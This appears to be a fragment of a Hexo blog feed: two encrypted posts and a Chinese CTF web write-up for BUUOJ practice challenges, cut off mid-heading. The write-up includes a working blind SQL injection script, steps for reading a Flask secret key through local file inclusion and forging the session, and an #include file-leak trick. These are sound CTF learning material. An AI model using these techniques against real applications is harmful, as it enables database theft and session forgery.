10adf7c158fb709d6cd840914363e43609c5d6092db8524b15271df0d4c39408993c78cd9cb5b11cfc039d1ffbfcba4f7f6fd92efbbbe2881847fc5a694006b6cfede0988f367d3af20ad441494421fc2e36c125fb7668ff169402913c9c5d439689a285d4bd4c05be1324ad558103b6c16f2bbd36aa1d82b6e49e0912ff98da21220c792025e414914bd89bd8e7c27a7f4605f4bb3d8b43ece49f42872646ec7cc669d6406f80e1c0a9341a12851589127fa1d1e17b421542282f9d134b67e41942d09f14ae14b6a925c614496cb8443fba682d8e7bad5e68f249380978de50dc513de6059e93a6cb773424050e71e1f38069197c2b3b94186a247c283663deb6b4685cc5998de0b8ba1b4823176909fb3ec48977b3545467e2261cfd714c6e35327fd69a4976f10b98ef98f9d7701ba02d4759a8879687ce15c91161144b8f23af9178c0eda3c3427e92fc4826e5778b6b970002abb6faddc153c8858451f5e7c19ddaacd680ec6e548b4b603cb865fe1bcfa9bce9b3635ca839f3f55c653a786e39cf1dec417b29857ff0afc471e8e0fc928c58d661c3f02b60832b2376f6b2a8e9dd5e913249b22dc5481c64a4ef47225cf6d70cb922be4b9e3c0ae27bca957f114b6e99f9159539987b32b4e6b765f3e4cf5d27e2963987611262ddec6530304157520702f56e9eb66471201b571bddb1001dfa17aaf7fa5ee80e583538d9f11513c404d166f2c2f0872a07b56650300a391dcf7f7cb6d034ad4ac6d6653d923eef37dc5edcd78c15d542e57f9fef177162ca57b1ba93fc6b1c35ab291fdeb17b445cd10738ad896dad6f093519413f6d69831771ea5a49b2073357a198cfbfaf29f3b30a1a5f37df392bb641d481f4103c24789adab77986444dc36503c96faa5cb9a7f082f01be14621550bc95af413a30465eb66e5c754af5a6a73c231804dff062831a379c97f69928da095194252d4571bd57fc87a35970aecd71d0e372f2218dae5ac96e49bd76614c98098c2e6657bd1c94ac7659aca82719eb06d64f6c9ce00ee2d5284dca58c3b67e494780fc2aaa8fe8a7a523ad40ba8985e5319c4c16590ec9b5d5d05142079bba75846db3d19b6ce7aecc564e75854da3760950bd0e2c3fb9f6b8282847a3a4348e37b65de38d871b58fb3b1aaa2c90ae4e54bd3a21dedd5a67cd0477b3b647ef835a34a19bf3ffa6e4011ddb7f0319ff3c213588ad40966a38491f645ff3935c2b256d2606a09011d4cd5d4e8cbd65d93915a011f534b04fce408864013ce1bcb43ae013b0ae93ed57d9116ca320328160f62c06dd9baa2c14bb60bc0102a20421c45ce7ff38502b90b90eb85b2fc4149ce9f32ceceba7f1cfcf384733b0d4dd55bbb31153f5b099f2aa2bb8d6ab4f006b69df73b1eef094674e0dfd8496d319042fbf89392849f0e9a6061daeab401332707caa7be204e664aeb6ef40f662f589ba1f65bc5d254887ef3e51657f1614ced66938ff75182e7db1aacb5b0c4ddb69267227660328324a00a3a7190766d92607a549b5896c0e1c282dda8b16f5b50bc14beff1fb6d3759b4c80b5511cd130730d99c580455ecbacd6ba58f9690c102d4c6cb6b1623fd2893c37200e1c23e1f385c1d246592212bd47939a21f8830676a3ae8b4aecdfe157bc933dae557e130e0f806cdae816bf196bbd9c3bc28300e497a4e9811f03f343311b65023e73aa86186d4fd10edfadf27d0f89a246c519d38ec8291b50a56c4d07713be0c9f181c9d18ffc5a616f1123b539b99e286c3873d31999c6d0f00bd6828cc20ae3ac7954bcbaf3d4bbd696c92439ad27bc812d5038d3068691839e4acb34633fa4e4b1c4cae477fc8052d3adefb744b96e73159192a2166075a3b463d723da258b81a0f8c0ae4234ded2c333fa263245ed08ae9052eb6eff47a79caf62b55be08077b50862ad0af4ac1436e05b39bcbf8bedcba1d37fd3e69dd4220a7a9e63210d5c5dd4d97a627721efe2d6f021ef8f612fd9310bf87830026a185667c53affff046bbd1878e7edf8f96b5589cf6db9b2e76d4e254686a98fbc2809e47ae4fbfba1a405028399b7bbc7c0fad33f803e0abf7bf59a9fd0c3a42b2e7ecbc048a0699f4e89c69ec5e05243fb9d72aac058de9927345b6cb7fd2a14904719f0dc8f6cdebe933819f0d799b82dee5ab1939a948d93109035464e06a12083f829bdbe56ee15eb1406004945412b690937df32cd830e1075914c3284e013f751fae9e5f30c82ca844334e3fcb21a4b23d9712999c0ce048b0dfda4e0c2b8b2d3c9611f4f4fe1aaef00a361d139fba66d97b43f8831e192108bde839903323738a0a3217d6c7523d33d748269de732d69631227e2d6c0a03cf9cc0fa1f4f8c97a1e013a0b279be258f536d3075cf4ebc79d31a43d5e1374b617cbe5419500d4cd12ff12330f52546ab67edfc8316c1304aa11a5b3aa0c3d64948e298a39ecac7fd26c59d17546a165946febab85673c37f4e75f2f74af952766979c322ec8cc62e5b77bd5b7e17c8601a5366e92d56e60713df35de9020d7c8253638fe4a850ee6a2c68238f91633eb873f9f928a1c38e22a04c2e3bad763d7803b574bc6f13fd3388eaf3f3e0fc6165ac2371dd3fa169f5bc5b15107fc1f9063467d439a1c1acbe509bf1cdcdcc6de8e8a6836ba828e5cc802399ec31d339e953b4d7bdb0dc572dc4c51b410b2c45817a0e0d55761ba749afd74f2a80c69abacca7965cac5237ae707276d8e21ab4326289972b20830d166b3a18dc7283529fcc8ca4b0b5d1a5757c3e348972569850dafe7a959cbf430acc7f2241072d7b46ceeea4e3bf6f280398195f3c161ba6b2f2d6d292488492c599031ff0d192ba2f146e7e7a4fb98eab1be0918182d6c226bcc2f97a511230b1f1c286f110a4626fbf85f348f647f7b2a6e4518832a659a42fbd4bf29597f3085717f8c1012422aafb907f29409fb7b09b65f27032e52281d343b5bef8414878712169d2335c07aad8111691a848fba8fb661a097a80ba34fdb57ff2e65dca395941eaae7fb86f8d756adac18f0211fe2c1d97901e65ea9491ec4bdbf9be0c3e554b1e94bff6bb90f6a878bf1f77c8cc59b2312216632ba51b2b8dfd12f2a101c859bc3e8ab6dd30bf7f0470f380dafaa69ef9a431544889acbcf818b8b0da6a1d670599a05886a14324482f7a973df650d879ff813c7d061966f96a2f3221e2ec2b91155fe3b2d8a4462fe6b774e2b79e8af76b949ca9ce455c875ae1a7805e04e495e34455ba2d590fa8f055e2575615c79453848d4fbd7fa6552c63ea2ad0d2f177dcbf991da2c5adb0cd3ab491b88f3278b787496e47a5f0fa8c5081e66c158287bc9af13d836aa99962dabed59bc0801f83ff4a79c08bedcb81ad31f838182cbc7ee4f9e6b404cbd8021a2fff7f80aaa2a9bb309a8f23478424ba6727ff5fa63b48967fb58957195e43643bd30018790156db39b7ff4d212f4df40b11765273912ad110b6edaa4394e6070a6efe8049b1bb30150265c0c5ac744d5d3a7f539ae6274f59813abcfa06b7a045d956717ccab27108b50a71804ebeda2bc5c186b3e64a2b0de27c4b5866de621951a7ca359ee3eca737edb87ca49375e8c8ee0f222d61961734b9aaa9b3a6a6eb24575a4bd07eed7f52c74c14e524c1aef798cdce21e705b54e7cfaf18d78c0d837662574fba612fb89a0d0d27a3f0241b7ec4b1112007172a4c1c62829a2a555e5a4eb6eb6ddb6262862d4a50fb32b4e10035073330db1f7733bc8ed28a18b3c73037bec85df11da2190666a42465c6637efa63099e662d8227232fecc44704d99b066e7ee581bf0a5a5b2064eaf0d004ec5a69cd39e2aaf58393ed44dabda25bf22e8300795e88cd006a45cc72d92bebd545b713dcd15ef7f991d093f127fde517b74cdb24e507f879aae5a1eeaf33798c802afca17e35d4835488e6a664ef8114b4d57aa1420afd9758119c29692d1d75a0f54f8fb5cafbcb15412877691dd04143faaed8bd864b8500875ac8beca0521c316c39ec13de5f27e6f456d2ef6265f66c1fcd219572ec7eff357ab6f29e995a232b56c1cb74768b1170a2691aab17ab968bc949e8825d336fe5bf8482610028fdc9724dd4d799e75272a8d4d83bbe17dcabc69f303481d39a44070d4bc540ab24e5af4927c319099f4f307b641ad50190e1562eb00d14fff14b8098310450e2d84affda832878b91347ff2e62c7dd541380b7ed0fcd66771dda3b20fd5cdd2726c58a4b85ff81041ee6a3c4695a665bf12301e5965200ff20bde6c6e52cb0d7eaf7747aa8cdd74bcdfb3c2627fd0aaef4ca2143a8b7948cc5ad69a7b27fac14e389e02b2e2c7853b8590d17cf4804dce3d41b6afe5a8386e3e261f66a17457f459c180f56d9af1e2f8d63236454ece285962d5301b3d820a6a3ff3888747a192b1080dabb6c8d9937789a5fc2374bebda12e766bdd1bdc1e58723bcd610a73766db0929aa0062be84aaaa68ed090b38aba4c4e19daab80fd38acf43fb7925ef2d6e6748802abf99dad62fcf62cac53b954664bdec5426b44b3487b2ad8a1531a519093f52eb7494000924112d3cbb750503277b809f8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="ISCC2020" scheme="http://yoursite.com/tags/ISCC2020/"/>
    
  </entry>
  
  <entry>
    <title>面试问题学习笔记</title>
    <link href="http://yoursite.com/2020/04/29/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/04/29/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-29T00:46:46.000Z</published>
    <updated>2020-05-04T15:21:23.101Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="4704e7c5dac779af5f7416d717deb74888b01085319c1dce2b7e54da9b1480ee">9262e6d46efa997ccdfdab1e867c4e46f7a0a9c19b7c941fa59486a9209bf99e7099bcfa5ddccaf8b8b2fd4d8aa4341295967a6477738ba9e3634d4464cd1fead226c1f54c4ea2648d866ff08a1da613919972980656a661307b5319a4e4a106b9ee69cc1bb4ead88cde2ce92d70856322260d51218e9d75949a630bc452604f4128cd19d04d6f4af2f8d4b8c413e5e8064a825769d39e5fd67d738fb785a7aeadda24fbe720b3e891785e4524c47f4ab6f3f7732fb223fc1d1278c8b12057c2b97890df9c443c6f0574ef43c871a71d15790077e652423fdf370ad5fc7a15f451e2518b43bc2b4959a8479cc38ea0792f783dd37b0a647a7c5e89f37cb290e3fa264ca51b86ddd129bd98707f817185be182c5f61b4b18e9575b736cf9a466e5c45c108443091cd5ef58eb9cb1c390fc73dcb595846293fedba02b164fd50ae5d2ec782bbfc666c2384bd0c454a7d7647841048f623f6089bade67e48ec66cf15e808ddd3f55ff3f3bf8daa8e214e5cca7177c16976ff1847d881deb30c0804f7e726bfbff6e67ff9e1f9180cd93a5fafc0b96340e6fa4fe655c777ec66d80428aaf0018696a41d2050a15113d840baf9e1cd3f5fae3e5977e267b7b6bd936ba6a2fed56ee26da2968b1d288d2aa1186393ea43d69c081ea81d32e915795a3c24266706a2e4750585dedae848fbd2b4f416f6d5abef641c3ada310ae00ad0213645090f47e3892595d92fba85f349c25c0ba008fb916b78193387001081ea77d7940e0d2d607666245c886bc7f9c0b11add7b7083c0f042240311e623b65188ab2175aa9c17eb9df0fd0f520382c7d5ee117ec5d3b6c984346e33cd39878d1d3bbe5bf73b93f815029cb4b8f1e2465f5a268aaf2b886dfc3dc4b81310d403bd2a53fb6ed91e6dd80bb4c3b5374e9bbf0adeb28167a9ba55daf81c2b6472c7b5d482110d7c231954e113d9713421c00289cb8cda18b1ca5ebc16c0292ccb6e23866e4ad1379e46a1d5f05c2845907baf47407c26bc6a73a5f3e861e178a2451edda1c9193b53df11dc4cfce9796d7fcfc255b5f137bd5c57af1f87c8ff8e8c5e8a00742930a84b335452f4189dac84b6815a2de5373a10820f69b0922fb903c1e1628ef147ecf679543ac3d03e8f30134bdf513172e7a42dc164a295119ef9d7c53289b51b4d4524eeea56550e76d4a9451eacf576da084c61eb1f602e0405d03825a2db6d5c3ee15017510ad1f95262d394a489e82960536c35e6467bf19995f57da137e2ca251eaa24a6b1deb5cf2fd8bdd261f2e45b4153a35d6f6378ec46fd86e4401e1832e4518f1ccf28699c8a050e647f89c6ae76983bbfc12baad3ab0e18abcc7d89d8ed710e1deff95de3eb03c9503590e2cd801eba4416c203f30e8aaed5674f61852001e7004df4ce85285679b5df671b7c087b56445dcdbe29ed09faabad13bd41746292fc78dc838e7e06e260cae1cf6ee63b34b141afc82d30ef5384f55929769ca490115429f7c147aa5391914818be24f49475898e7720e5ae9539ef34f8ca232001852e021a7bf43c72b9ef81739571a234a2ef07e856d8c4350c21f328c830188f4dc3a7e6d8c9f61cf086c51b1b7e6297a5c1c5b0213dfeb3e9efb12339553de2ec0724b7a17238db17389e05d4316f1cd51009cb756259ccc093e2d9c6c50240d572c44df386179588d2accf6ec17d9d2f5c232dbd08506274f461cf03df2a08602bd203e3b6e5ec3b45da26453923126fd3f09ba9624bacc505a708b27f69607b321678ed3853ff64357b7fe0bdaad1f851274557950e83d6ae28a55e9069a19a2c1bb3f89a65d23644419ca18320e9c6bcdcf91cda30f52f954712e0bb75eeca249f98c23b223a1d851b0e5a057e7e0716abf3a833069111964ad5a8acdd8432ad182e04e34de19c80991aa63accc2c017c838d25d7c34285e84ca57eb13eeab86035d77814aa030268a9711d758422f6c789e0eea170f9e7932fda003c83e5fe62592c1b73d068b8dc11f7575959f34bba0b3485a12a51e855d3c88e4885f7ebe9f2645649a1939897a2f4bc88117aebfefafb2a12678432fdd841f17a486d597095d1d2332ce172dd629d4f42d1052bbc45fef89e5111a100c82b829ba038e4fc58417a12ce3866b3fb490d8c81cb24cb32cb47bba79f7be04f105e4dd12ef7edf10b878405ea5bc078b337a5579e3086953926121e5d518b6f718bff42c1f6caaa9c2a845a194b7945b73c16f5059073a7b1b9ac25e7a716c844340be6439e97a514985c53504d3b3bdcf330c8d3a793a0fe01601b4878949f8656b04f9d8dfaf5c43b115acfd701cb992954ad61e844377ef93cf32fc450e6b841ff2edb082e2e69388c3a8c3de8bde1dfadeecb91094e781daf41dd745f9827da335956f2e740adc039286fcee30028213a19c48dc75d70e418789ddcac0c974f444b837d9432aa02de9a3634122990f86bd940963ac8962aee25e03c428b59e06b61eeb77967757234e75c5f940f5990cf105494bcae37a385e0c6f390c1630926fef32ea9610e8bae54d8841e17f8af07b714d8cc051a4fd54fcc583a021c0638f03c9593a93e305a4647a35a6f47fe3077892dce0e119d9c305698fab899829c1a6fa730599c4eab52f35f65fd6b71910fd93a5aac7698e6d20dba8d39e277201e64eae2fc5a69f68c42cfb602497df75ddd716864b98d6dffc03a94586da1556a81eaddb76b74f68b16d6760789742fded691568f97c58f36b1f420bff08945775d2279f82cb1a07fed15758cea552d160ea737b96f9641c7e1fa5c04865677057a18b11ee791121280c5f2f6d0a656b9f0a6bed2de1f3757e659d7938c245494213e7ded657d545789fc06d37681a54fd297f4ad7df8f6f3b9e09ecc7bde410ecfaf422eea4297998f4afda2a076ffbad498c0f1643ff831414a396e7b90182d3823bc8cc012dc444b3fbc94263c6e0a46c0474dd94c96f319908af023bdd25061978a0b8ccbd8eb9efad3f37c90500d0ac9d402a1cceb71e68f093bd6d5bcb73c300ff1f12e195f69251d7e03d64b8ffad9037483df5dc114839f4b9c24c0c56e38a300975c638bae407db644661e0845ba26b727e1c77c35c9fe08431653e20dff881b00452df1dffbd2e43d7b6b4731c09e252740d0e787eb61b35e23bd00074056cb72cf179b5109a20f27a3ed5e7c2bef71a9107ab1be44ca875fc81da4eb3cfa60fb5c21bdb102b4872496d0dd67121c2708ff83927f166385b92685306967f8bd4f3b1ad17af460f4f0fd9616b8829387214011eed2082a41014bc87bede12baf7ef10330c0fafef469ae4e03608aa7d4ea380500f87460720c6627e9cda487a48e47d6c44dbbba246294005974cac0b967107476782c18935b850fc842c3b44b9cd20563285e2dd76359775f0973fda74d08b21a41573d389563ff0817ee4e8d7bca03f481e17127c7269ffb719a4ff663d2611850cabcd8f5b7d3447eb9071ea371b53c1d19d794a85ade8e6ba1ab64676723de7e494d7cb6cd801c52136cf29f7af21770b47d9e52a3ae2badb64e212aaff5c51e80d6c73ab12be8bb92a9db9bfb449d51afcee0dde2702bfb5ad8d3e6a3ef72bb5563e4cbe2089dce860859e6d1275f114c09405f4cc8743815cc28e3442cc4c8585181b38c75dcabe532c38d7a076767007caff52d18e55f2ea5af63960149af1117355c9c14146080ceb671938509e5468285aee7466a98f4715ed376b7b7cd5cd7ccdd9d467391c55379192780205b4b2208c6bb389d94dd8815e858aa0cc36cc2580256f46d6c6784ac6ec3bedafa6cc0f7e01d92f09ce627ad4ca8a83b43d2e2ba4afe5fe276bcf582f375dc9081a7df3feeca1e341e4182c9e2399ca6ab4fac67c6b886ed52f6f4aac271f4423bbea8194544e722eee393ad0451b148b645953dcb05d60061b920ef2113e2e70cd2739e4f1e5798da1aa437facd41cf55a5ee9f048c35789b001c09b88fd8d042908817abe256ee24108e1ae64f0f573fa8694abd3c52a879f62c590b5e5c452fedb74b33898d21b587c51d64f4a0b704cbe5a5a9437a995994147e346a0afc1347c7d22f827567acc447da157df6c501abcdeade2573c6a3da633ea607c925f2f0395f498e8f9dff09ba4f2719613c44cf420c79f33f6c24042b24a90710d82c85cd8c89891094a25ad49c4e595e0db71904796a2d3091b76300476d4fd03b030823252266f929724bc7765fd4797255a5d6b8375319b139c8b51eeaa35076df1f7269cf58a80802ad087da7c3be8e08b793e4691c36b66426dad79f668cc1ca46d819cd58d02816ccde4073920b7a4a4ffe2adb9304820a9d5b0f3b2b99347209200c739c7ccf9ff438d6a84310f8d1c594d03bd1ba8f5f2572573ff2349c3fd6f3f23ff681d2acb31eac5b52511c5966bd114f77ed208fe91788c7b15369826910b5d31dde63d9d82cf0c827aa3913177652bda854e6cbf2d0ecf435f43fb48cd708143435315e7bec16ee330eb1e09fa9f07ebc909af241a22fa953dcb8ea34283d110b02379268b88d3e74782b2cdac772e4e8f51e1d224a442b110104fd4ae04282c63e0f5e3d8f7c2a86ab4c35d1795c0e4f41dde8143f37696c6c5426f6452d8ceeae1f1e66997a37e7bc9d3ca570490d0c8f66e9526a6700d055330537c5b4471e12243433d01a51cfd8a09ebac6eaaf11e82661e6a2e47ad6b7a0cf98f7c2cc3a847f5a9aa058f99c10c5a239798bb140ecec01c17577f9c06de33f911612304925b56807f8b27492198173035daf4760ba61d5049e972c97cc441d7abb77e028b9cbee584d7bb835dd649d367ade2536da38ce0d0387318efa301258268bb0e52f82c9787d9f423cceca033309fa9c7b4e3dcbd2aa86377e5100667b85efbc071e35a685ec9e1b11384dd6e6b8abd70133dd0250916a313b2d03d4d672fa65309e59bdefb70e6fafb17c715e29a0dfac36970c99541b25b7adc082a36c578c816c9156089254b349e462396722847555faee3b93c1572dfa9eb8b096753cc0f3d6b5da8fd76f8ca0a50c65a5c720de93bac2a05af3cfcc721b3b90c3fd7a35a06ed9d572808de496f92b649b37a09cb688e237e2610f22d5bfb48cedc1fa5c864dfd0e721934681fa85dfb882de50a5eb0f11fe0734888dfb301a0f42755206e808de0eb5059e6de37fcadae3c010d3c28e6a54a1554b7aa854dc2bc79e4102302c073e00b4237ee3d4749d02af180482faf9352adab66b4e5ab4b00fdaa3156944cfd0adc849fe64ad38620726671289903567481e3a086b7a753647958eed34bfdee35256000f3e28896ddc93c2912340e2f7e9930d94b6b0fc2288a17294a1e09a4ea70ccf3bb7d0dd28242eae122fa71c5eb3a78ba60cc6167749cc348af4260756aba9b5feb39ed499ab0ef562371175d063be8b511a58c47666fe48c0cd57fb2c1453d8baaf039ba055a84af1b0f13939388ac919c323c503920befb8297644530325c63e58152c8bf32bb63d28051e873bb2f73ae079251c2747373ca7080fc1849b07fbb47a5a17d5d61af036a30d81996361b703f3d4d432f35899ceb63a27a09f90e6f43a30dd2bd983bb8d7639c207937b328dbf8e4085156d9b69c8e2868766dd5098597117ca77c8adbd7fdedb887c543cb3b9ad296169fdbce1125084409ff4046f57e0e1a79ad9d3411b48989de86fe59a4827594990a1f16683e7c084beefcfa6d80e6bf468308318a092e1be6a58ad4c74af96f08357be0f4dc3cfc4cd1db7fa06debc583f6824ba476c4b9d795bbe8704f62e489473c37661e2846ab557e2ef277d7cfad85e2047da4ea4116dfe3a3a2073cd5d51046defe1c6d27295c23cd0fa20fca67628d4312f60ca46b99babf24f1506c504e151af4a15c6fc68054aa0c6d41fb7e157ccfae8912adbd9a49f9cb074c4ebea66b270291736102c190ed479428ecbd3b34cac011836bcd7675320dd4fa929c9e9d7312a3ec91979de3c49799d05dc11de001dca65250d96d54d34519f47b2c487a6a0bb3e4039b1d06c9025e8f08dc000c236fdb1cc57cd1b7849f274f8332e321d688dee78ce866030c5feab16f9a544a220926ff56dd64114216be2d9f2c9e436c2093dbdc3f844509688d0576a51e0f54de7d4a45919aa7a2037aa720c144aa9c39cfd3add4c4c32ebeb39e6fd0c6954c3f6e0d7d9c91afeac7d8644a519594906897a401b2dd71710f9a69c1e47062dbac504c33aa1fbea9b33fff957d64646d43f8dbf3c43a3d48c5fba576eb2d1d59b3f3e7084da84161ca03ebffb69fe6d78e40b96027ca65b547cba940587b47bc6388f92648d47c9f56c6662803b41af06faf1bee4d05eebcb57c63d42c76a3e04af61e1fb4a2ec8e423dbb447f02c66dd24b2701ca833dd5aae9c274a1ee3eec49c59f411452ea88497e691656c5c1bab2b9de5ae7fbbe90e16948c87c4ba0905572bd9c0333b2615cfc4c13bc9240d78df537eda05d0fd6fd5b0bd568b20b400219c534c0cfaf2a8b68e3f4c20d443e47ba4081d6042815d4420875e2ae0561ea2162c2376b5fdac92a365a31ee02f97050e4dd61e7059ae3e590ca177fe9f9b3b0023784069565700c75af5f98c49976f7ef8634397412bf9f4f539cdd8ff7f7c99b82500c2e08785d42d8dba372e0d11683c21f477eb6bb5a3aafc8def38e38565c9a601c37a6a59c7691ea46c603de868f0ce67dacb5ddbfb2a0328bdce102b70b8192edc1ecc817d15447b1830fdc5e074689d7185b2</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUOJ-web刷题（五）</title>
    <link href="http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/</id>
    <published>2020-04-28T06:13:59.000Z</published>
    <updated>2020-05-09T15:42:25.578Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-PASECA2019-honey-shop"><a href="#0x-01-PASECA2019-honey-shop" class="headerlink" title="0x 01 [PASECA2019]honey_shop"></a>0x 01 [PASECA2019]honey_shop</h3><ul><li><p>考点</p><p>SQL注入、session机制</p></li><li><p>解题过程</p></li></ul><p>在templates下的PHP文件都有一句话：<code>!isset($_SESSION) AND die(&quot;Direct access on this script is not allowed!&quot;);</code></p><p>$_SESSION数组在session_start()初始化后才产生。因此我们直接访问templates下的，$_SESSION还不存在。</p><p>与Session相关的另一个选项叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()（具体请参考<a href="https://www.php.net/manual/en/session.upload-progress.php" target="_blank" rel="noopener">这里</a>）。</p><p>本地测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.8&#x2F;login.php&quot;</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;&quot;file&quot;: &quot;123456789&quot;&#125;</span><br><span class="line">a &#x3D; requests.post(url&#x3D;url, files&#x3D;files, data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span><br><span class="line">                  cookies&#x3D;&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,proxies&#x3D;&#123;&#39;http&#39;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><p>利用代理抓包发现成功执行session_start();</p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428142152982.png" alt></p><p>在login.php中存在SQL注入，最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import requests</span><br><span class="line">dict &#x3D; &quot;&#123;&#125;-abcdefghijklmnopqrstuvwxyz1234567890&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;67fab014-d40a-4993-ba68-b765f4741a63.node3.buuoj.cn&#x2F;templates&#x2F;login.php&#39;</span><br><span class="line">files &#x3D; &#123;&quot;file&quot;:&quot;123&quot;&#125;</span><br><span class="line">data &#x3D; &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;123&quot;&#125;</span><br><span class="line">cookies &#x3D; &#123;&quot;PHPSESSID&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">for b in range(1,42):</span><br><span class="line">    for i in dict:</span><br><span class="line">        params&#x3D;&#123;&quot;username&quot;:&#39;test&quot; or (ascii(substr((select group_concat(secret) from flag_tbl),&#39;+str(b)+&#39;,1))&#x3D;&#39;+str(ord(i))+&#39;)#&#39;,&quot;password&quot;:&quot;test&quot;&#125;</span><br><span class="line">        a &#x3D; requests.post(url&#x3D;url,files&#x3D;files,data&#x3D;data,cookies&#x3D;cookies,params&#x3D;params).text</span><br><span class="line">        if &#39;meta&#39; in a:</span><br><span class="line">            print(i)</span><br><span class="line">            flag +&#x3D; i</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/</a></p><p><a href="https://guokeya.github.io/post/N0i4q6Q4f/" target="_blank" rel="noopener">https://guokeya.github.io/post/N0i4q6Q4f/</a></p></blockquote><h3 id="0x-02-PASECA2019-honey-shop"><a href="#0x-02-PASECA2019-honey-shop" class="headerlink" title="0x 02 [PASECA2019]honey_shop"></a>0x 02 [PASECA2019]honey_shop</h3><ul><li><p>考点</p><p>lfi、flasksession安全机制</p></li><li><p>解题过程</p></li></ul><ol><li>通过图片下载功能本地文件包含读取当前进程的环境变量，获取SECRET_KEY</li></ol><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193139821.png" alt></p><ol start="2"><li>解密当前的session，得到<code>&#39;{&quot;balance&quot;:1336,&quot;purchases&quot;:[]}&#39;</code>，修改金额，再次加密购买得到flag</li></ol><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193306847.png" alt></p><p>加解密脚本：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><p>需要注意的是那个脚本对Python版本有一定的限制，最好是在Python 3.6 Linux下运行。</p><p>参考资料：</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/10/19/PASECACTF-2019-Honey-shop/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/10/19/PASECACTF-2019-Honey-shop/</a></p></blockquote><h3 id="0x-03-FireshellCTF2020-Caas"><a href="#0x-03-FireshellCTF2020-Caas" class="headerlink" title="0x 03 [FireshellCTF2020]Caas"></a>0x 03 [FireshellCTF2020]Caas</h3><ul><li><p>考点</p><p>文件包含</p></li><li><p>解题过程</p></li></ul><p>题目是输入C语言代码。会给你一个编译好的可执行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include 命令告诉预处理器将指定头文件的内容插入到预处理器命令的相应位置</span><br></pre></td></tr></table></figure><p>通过包含根目录的flag报错来显示文件内容</p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193819948.png" alt></p><h3 id="0x-04-GoogleCTF2019-Quals-Bnv"><a href="#0x-04-GoogleCTF2019-Quals-Bnv" class="headerlink" title="0x 04 [GoogleCTF2019 Quals]Bnv"></a>0x 04 [GoogleCTF2019 